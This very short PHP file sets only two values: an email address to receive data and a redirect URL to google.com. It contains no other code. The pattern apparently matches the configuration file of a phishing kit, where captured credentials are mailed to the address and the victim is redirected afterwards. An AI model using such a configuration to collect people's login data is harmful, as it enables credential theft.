<?php 
$Receive_email="richmo421@outlook.com";
$redirect="https://www.google.com/";
?>